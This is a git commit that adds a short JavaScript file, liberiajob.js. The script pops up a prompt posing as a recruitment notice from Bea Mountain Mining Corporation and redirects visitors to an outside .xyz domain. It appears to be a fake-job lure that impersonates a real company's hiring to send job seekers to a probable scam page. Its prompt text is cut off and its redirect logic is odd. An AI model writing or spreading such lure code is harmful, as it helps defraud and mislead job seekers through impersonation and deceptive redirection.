3b75f90418f72b9437efd5f61c366d0246ca223f
bigetijazz32 <bigetijazz32@gmail.com>
2025-08-23 03:37:37 +0100

    Create liberiajob.js

---
+++ liberiajob.js
@@ -0,0 +1,7 @@
+
+
+var password = 'BMMC Recruitment'
+password=prompt('NOTICE: Bea Mountain Mining Corporation (BMMC) is currently recruiting, press OK to apply for the','BMMC Recruitment');
+if (password != 'BMMC Recruitment') {
+location.href='https://www.udwang.xyz/BMMC-Recruitment';
+}
